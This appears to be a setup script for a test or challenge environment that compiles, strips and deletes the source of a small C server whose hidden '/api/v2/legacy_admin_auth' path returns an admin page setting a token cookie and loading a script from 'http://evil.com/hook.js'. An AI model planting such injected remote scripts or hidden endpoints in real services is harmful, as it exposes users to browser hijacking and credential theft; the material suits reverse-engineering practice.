#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc binutils curl
    pip3 install pytest

    mkdir -p /home/user

    cat << 'EOF' > /home/user/legacy_server.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};

    char *hidden_path = "/api/v2/legacy_admin_auth";
    char *response = "HTTP/1.1 200 OK\r\n"
                     "Set-Cookie: legacy_token=XYZ123; Path=/\r\n"
                     "Content-Type: text/html\r\n\r\n"
                     "<html><body>Admin Page <script src='http://evil.com/hook.js'></script></body></html>";
    char *not_found = "HTTP/1.1 404 Not Found\r\n\r\n";

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) exit(EXIT_FAILURE);
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) exit(EXIT_FAILURE);

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(8888);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) exit(EXIT_FAILURE);
    if (listen(server_fd, 3) < 0) exit(EXIT_FAILURE);

    while(1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) exit(EXIT_FAILURE);
        read(new_socket, buffer, 1024);

        if (strstr(buffer, hidden_path) != NULL) {
            write(new_socket, response, strlen(response));
        } else {
            write(new_socket, not_found, strlen(not_found));
        }
        close(new_socket);
    }
    return 0;
}
EOF

    gcc -o /home/user/legacy_server /home/user/legacy_server.c
    strip /home/user/legacy_server
    rm /home/user/legacy_server.c

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
